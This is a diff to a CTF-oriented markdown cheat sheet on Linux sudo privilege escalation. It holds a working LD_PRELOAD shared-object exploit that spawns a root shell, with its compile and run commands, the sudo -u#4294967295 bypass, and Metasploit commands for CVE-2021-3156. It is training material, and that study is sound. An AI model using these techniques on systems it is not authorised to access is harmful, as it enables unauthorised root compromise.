@@ -5,6 +5,7 @@
 [![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
 [![linuxprivesc](../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
 [![commonlinuxprivesc](../../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
+[![linuxprivilegeescalation](../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
 [![picklerick](../../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
 [![linprivesc](../../../_badges/thm-p/linprivesc.svg)](https://tryhackme.com/room/linprivesc#task-12)
 [![wgelctf](../../../_badges/thm-p/wgelctf.svg)](https://tryhackme.com/room/wgelctf)
@@ -30,7 +31,7 @@ $ sudo -nl # without a password
 $ sudo -l # with a password
 ```
 
-The first section is about settings and environment variables that may be exploited such as [LD_PRELOAD](#ldpreload).
+The first section is about settings and environment variables that may be exploited such as [LD_PRELOAD](#ld_preload).
 
 ```text!
 Matching Defaults entries for [...]:
@@ -68,6 +69,7 @@ User [...] may run the following commands on [...]:
 
 [![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
 [![linuxprivesc](../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
+[![linuxprivilegeescalation](../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
 
 <div class="row row-cols-lg-2"><div>
 
@@ -76,7 +78,11 @@ If there is `env_keep += LD_PRELOAD` in the permissions displayed by `sudo -l`, 
 The code below replace the gid/uid of the user running the command with `0` <small>(root)</small>. Then, it pops a bash shell <small>(as root!)</small>.
 
 ```c
+//#include <stdio.h>
+//#include <sys/types.h>
+//#include <stdlib.h>
 void _init() {
+    //unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
     system("/bin/bash");
@@ -89,6 +95,7 @@ Compile it with
 ```
 $ cd /tmp
 $ gcc -shared -fPIC init.c -o init.so
+$ gcc -shared -fPIC init.c -o init.so -nostartfiles
 ```
 
 Then, call the command that you could run as administrator <small>(`tar` here)</small>, while setting the variable path to your script:
@@ -98,6 +105,8 @@ $ sudo LD_PRELOAD=/tmp/init.so tar
 ```
 
 💎 Congratulations, you are `root` now!
+
+⚠️ Actually, it may work if there is `env_reset` too?
 </div></div>
 
 <hr class="sep-both">
@@ -123,6 +132,14 @@ $ sudo -u#4294967295 tar [...]
 #### sudo before 1.9.5p2 (CVE-2021-3156)
 
 [![metasploitframework](../../../_badges/htb/metasploitframework.svg)](https://academy.hackthebox.com/course/preview/using-the-metasploit-framework)
+[![linuxprivilegeescalation](../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
 
 See metasploit module: `exploit/linux/local/sudo_baron_samedit`.
+
+```shell!
+msf6> use exploit/linux/local/sudo_baron_samedit
+msf6> set SESSION 1
+msf6> set LHOST tun0
+msf6> run
+```
 </div></div>
